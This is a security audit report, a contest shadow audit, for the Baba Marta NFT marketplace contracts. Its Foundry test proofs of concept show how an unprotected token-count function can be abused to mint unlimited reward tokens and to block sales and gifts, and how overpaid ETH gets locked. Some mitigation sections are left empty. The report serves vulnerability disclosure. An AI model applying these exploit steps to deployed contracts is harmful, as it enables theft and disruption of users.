![](../logo.png)
<img src="../img/baba-marta.png" alt="Baba Marta" height="320" />

# Security Report for the Baba Marta CodeHawks FirstFlight Contest \*_shadow audit_

## High Issues

### [H-1] Anyone can get unlimited amount of free `healthToken` without needing to buy a listed `martenitsaToken`

**Description:**

The criteria for getting one `healthToken` is that the `address` must have 3 different `martenitsaToken`. But, a prankster can bypass this by;

- Increasing the number of `martenitsaToken` they own by repeatedly calling the `MartenitsaToken::updateCountMartenitsaTokensOwner()` with the `add` operation
- And then claiming `healthToken` with the `MartenitsaMarketplace::collectReward()`
- Doing this repeatedly

**Impact:**

- The prankster gets unlimited `healthToken` for free
- `MartenistaToken::producers` will not make sales from listing and selling `martenitsaToken` as people will no longer no see the need to buy

**PoC:**

Add this test to any of the test contracts:

```solidity
    function test_get_multiple_health_tokens() public {
        address larry = makeAddr("mr get free health tokens");

        // larry updates his martenitsaToken count
        vm.startPrank(larry);
        martenitsaToken.updateCountMartenitsaTokensOwner(larry, "add");
        martenitsaToken.updateCountMartenitsaTokensOwner(larry, "add");
        martenitsaToken.updateCountMartenitsaTokensOwner(larry, "add");
        vm.stopPrank();

        assert(martenitsaToken.getCountMartenitsaTokensOwner(larry) == 3);

        vm.prank(larry);
        marketplace.collectReward();

        assert(healthToken.balanceOf(larry) == 1e18);

        // repeat the process
        vm.startPrank(larry);
        martenitsaToken.updateCountMartenitsaTokensOwner(larry, "add");
        martenitsaToken.updateCountMartenitsaTokensOwner(larry, "add");
        martenitsaToken.updateCountMartenitsaTokensOwner(larry, "add");
        vm.stopPrank();

        vm.prank(larry);
        marketplace.collectReward();

        assert(healthToken.balanceOf(larry) == 2e18);
    }
```

**Recommended Mitigations:**

### [H-2] Producers can get sales of their listed `martenitsaToken` reverted by pranksters

**Description:** 

Per the `README`, buyers can buy `martenitsaToken` listed by `producers`. But, if a prankster calls the `MartenitsaToken::updateCountMartenitsaTokensOwner()` function with the `address` of the `producer`, as well as the `sub` operation, sales will revert.

*P.S.* If knowledge of how many `martenitsaToken` a `producer` has created is known, a prankster can call `MartenitsaToken::updateCountMartenitsaTokensOwner()` function with `sub` operation as many times as `martenitsaToken` a `producer` has created to ensure that all sales from that creator revert.

**PoC:**

Add the following test to any of the test files:

```solidity
    function test_can_revert_producer_sales() public createMartenitsa {
        address larry = makeAddr("mr trickster");

        // larry reduces chasy martenitsaToken count
        vm.prank(larry);
        martenitsaToken.updateCountMartenitsaTokensOwner(chasy, "sub");

        assert(martenitsaToken.getCountMartenitsaTokensOwner(chasy) == 0);
        assert(martenitsaToken.ownerOf(0) == chasy);

        vm.startPrank(chasy);
        martenitsaToken.approve(address(marketplace), 0);
        marketplace.listMartenitsaForSale(0, 1 wei);
        vm.stopPrank();

        address buyer = makeAddr("buyer");
        vm.deal(buyer, 1 wei);

        // buyer attempts to buy chasy's listed martenitsaToken, but the sale is reverted
        vm.prank(buyer);
        vm.expectRevert();
        marketplace.buyMartenitsa{value: 1 wei}(0);
    }
```

**Recommended Mitigation:**


### [H-3] Legit buyers can have their attempts to gift presents reverted by pranksters

**Description:**

Users can gift their `martenitsaToken` to other users by calling `Marketplace::makePresent()`. But if a prankster calls the `MartenitsaToken::updateCountMartenitsaTokensOwner()` function with the `address` of the gifter, as well as the `sub` operation, gifting will revert.

**Impact:**

Add the following test to any of the following test files:

```solidity
    function test_can_revert_make_present() public listMartenitsa {
        address larry = makeAddr("prankster");
        address hana = makeAddr("bob's gf");

        vm.startPrank(chasy);
        martenitsaToken.approve(address(marketplace), 0);
        marketplace.listMartenitsaForSale(0, 1 wei);
        vm.stopPrank();

        // bob buys martenitsa token
        vm.prank(bob);
        marketplace.buyMartenitsa{value: 1 wei}(0);
        assert(martenitsaToken.ownerOf(0) == bob);

        // larry reduces bob martenitsa balance
        vm.prank(larry);
        martenitsaToken.updateCountMartenitsaTokensOwner(bob, "sub");
        assert(martenitsaToken.getCountMartenitsaTokensOwner(bob) == 0);

        // bob attempts to make present for hana, which reverts
        vm.startPrank(bob);
        martenitsaToken.approve(address(marketplace), 0);
        vm.expectRevert();
        marketplace.makePresent(hana, 0);
    }
```

**Recommended Mitigation:**

### [H-4] `MartenitsaMarketplace` contract is not built to handle incidents where buyers overpay for an NFT

**Description:**

Per the `README`, a buyer has to pay the listed price of an NFT before they can acquire it. But, if the buyer overpays for an NFT, there is no logic to refund them back the excess `ETH`.

```solidity
    function buyMartenitsa(uint256 tokenId) external payable {
        ...
        ...
--->>   require(msg.value >= listing.price, "Insufficient funds");
        ...
        ...
    }
```

**Impact:**

Since there is no logic to handle refund of excess `ETH`, as well as no withdraw function in `MartinitsaMarketplace` contract, any excess `ETH` is locked in it forever.

**PoC:**

Add the following test to any of the test files:

```solidity
    function test_here_we_go() public createMartenitsa {
        vm.startPrank(chasy);
        martenitsaToken.approve(address(marketplace), 0);
        marketplace.listMartenitsaForSale(0, 1 wei);
        vm.stopPrank();

        address bob = makeAddr("un-attentive buyer");
        vm.deal(bob, 5 wei);
        vm.prank(bob);
        marketplace.buyMartenitsa{value: 5 wei}(0);
        assert(martenitsaToken.ownerOf(0) == bob);
        assert(chasy.balance == 1 wei);
        assert(address(marketplace).balance == 4 wei);
    }
```

**Recommended Mitigation:**

Refactor the `MartenitsaMarketplace::buyMartenitsa()` function to `require` that only the listed price should be paid for any NFT.

```diff
    function buyMartenitsa(uint256 tokenId) external payable {
        ...
        ...
-       require(msg.value >= listing.price, "Insufficient funds");
+       require(msg.value == listing.price, "Pay the exact amount");
        ...
        ...
    }
```


